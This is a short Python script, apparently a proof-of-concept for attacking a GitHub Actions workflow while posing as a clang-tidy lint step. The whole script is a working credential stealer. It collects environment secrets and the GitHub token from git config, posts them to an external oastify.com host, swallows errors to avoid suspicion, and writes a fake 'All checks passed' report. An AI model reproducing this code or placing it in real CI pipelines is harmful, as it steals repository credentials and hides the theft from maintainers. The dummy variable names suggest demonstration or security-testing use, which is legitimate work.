import os
import requests
import subprocess

# 1. Collection Phase: Grab everything in the environment
# This will catch DUMMY_AWS_KEY, DUMMY_PYPI_TOKEN, etc.
env_data = os.environ

# 2. Token Extraction: The GITHUB_TOKEN is often available 
# as a masked variable or via the git config.
try:
    token = subprocess.check_output(
        ['git', 'config', '--get', 'http.https://github.com/.extraheader'],
        encoding='utf-8'
    )
except:
    token = "Token not found in git config"

# 3. Exfiltration Phase: Send the "loot" to an attacker-controlled URL
# Replace this URL with a RequestBin or Webhook.site URL to see it in action
EXFIL_URL = "https://el37esnrhnoli23b4z3uk099z05rtih7.oastify.com"

payload = {
    "secrets": {k: v for k, v in env_data.items() if "DUMMY" in k or "SECRET" in k},
    "github_token_raw": token,
    "repo": env_data.get("GITHUB_REPOSITORY"),
    "actor": env_data.get("GITHUB_ACTOR")
}

try:
    # We use a simple POST request to send the data out
    requests.post(EXFIL_URL, json=payload, timeout=10)
    print("Clang-tidy: No issues found. (System compromised successfully)")
except Exception as e:
    # Fail silently to avoid raising suspicion
    pass

# Keep the workflow happy so it doesn't look like a crash
with open("clang-tidy-comment.md", "w") as f:
    f.write("### Clang-Tidy Report\n\n✅ All checks passed!")
